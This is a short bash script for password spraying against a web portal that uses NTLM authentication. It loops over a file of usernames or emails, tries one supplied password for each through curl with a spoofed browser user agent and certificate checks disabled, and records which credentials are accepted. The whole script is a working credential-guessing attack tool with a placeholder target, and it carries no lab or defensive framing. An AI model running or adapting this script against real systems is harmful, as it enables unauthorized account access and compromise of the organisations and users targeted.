#!/bin/bash

IFS='
'
#--------------------------------------
# change the following variables 
# according to your needs
#--------------------------------------
server='http://portal.domain.com/blah'										# target server
domain='' 													# leave it blank/empty if bruteforce is against emails instead of usernames  
#--------------------------------------

password="$1"													# the password used for the test
userslist='a.txt'												# list of users/emails
tempfile='a.tmp'												# just a temp file
tempfileall='all.tmp'												# all the tests done / just for reference
resultfile='a.results'												# all results / credentials guessed
errorfile='a.errors'												# all errors occurred during the tests
debugfile='debug.txt'												# contains all credentials tested
timeout=1800													# wait xxxx seconds before completely finish the test
user_agent='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'
#--------------------------------------

for i in `cat "$userslist"`; do

     echo "testing user: $i - $password" >> "$debugfile"
     if [ -n "$domain" ]; then
        curl -A "$user_agent" -k -v "$server" --ntlm -u $domain\\$i:$password &> "$tempfile"
     else
        curl -A "$user_agent" -k -v "$server" --ntlm -u $i:$password &> "$tempfile"
     fi

     if [ "$?" -eq 0 ]; then

         egrep -q "NTLM.*handshake.*rejected" "$tempfile" || {
              echo "cred found : $i - $password" >> "$resultfile"
              egrep -v "^[[:blank:]]*$i[[:blank:]]*$" "$userslist" > "$userslist"2
              mv "$userslist"2 "$userslist"
         }
     else
             echo "$i - $password" >> "$errorfile"
     fi

     cat "$tempfile" >> "$tempfileall"
	 sleep 1
done

# wait for xxx seconds
sleep $timeout
